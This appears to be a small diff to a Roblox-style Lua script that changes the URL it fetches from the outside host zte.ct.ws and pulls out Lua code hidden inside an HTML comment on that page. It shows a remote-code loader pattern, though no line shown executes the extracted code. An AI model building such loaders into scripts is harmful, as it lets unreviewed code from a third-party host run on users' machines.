@@ -1,5 +1,5 @@
 
-local website = game:HttpGet("http://zte.ct.ws/")
+local website = game:HttpGet("http://zte.ct.ws/?=iloveyou")
 local start_i, _    = website:find("<!--")
 local _,      end_i = website:find("-->", start_i and start_i+1 or 1)
 local lua_code = website:sub(start_i + 4, end_i - 1)
